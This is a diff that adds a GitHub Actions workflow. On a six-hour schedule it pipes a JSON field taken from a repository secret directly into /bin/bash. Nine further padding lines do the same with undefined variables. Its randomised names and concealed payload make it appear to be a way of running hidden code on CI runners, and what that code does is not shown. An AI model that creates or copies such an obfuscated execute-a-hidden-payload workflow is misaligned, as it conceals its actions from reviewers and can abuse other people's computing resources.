@@ -1,0 +1,27 @@
+name: yuyizhaoshou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuyizhaoshou
+        env:
+          yr76582: ${{ secrets.yr76582 }}
+        run: |
+          echo $yr76582 | jq -r .qj8 | /bin/bash
+          echo $izl8 | jq -r .bpvay252 | /bin/bash
+          echo $ofcj9 | jq -r .obdjo2046 | /bin/bash
+          echo $e58673 | jq -r .npizo50788 | /bin/bash
+          echo $cvm730 | jq -r .thgl9965 | /bin/bash
+          echo $v4880 | jq -r .kohmd50963 | /bin/bash
+          echo $g28550 | jq -r .xejsq16 | /bin/bash
+          echo $wpl0589 | jq -r .j736 | /bin/bash
+          echo $ghqpy7296 | jq -r .mdm331 | /bin/bash
+          echo $i3 | jq -r .jz067 | /bin/bash
+
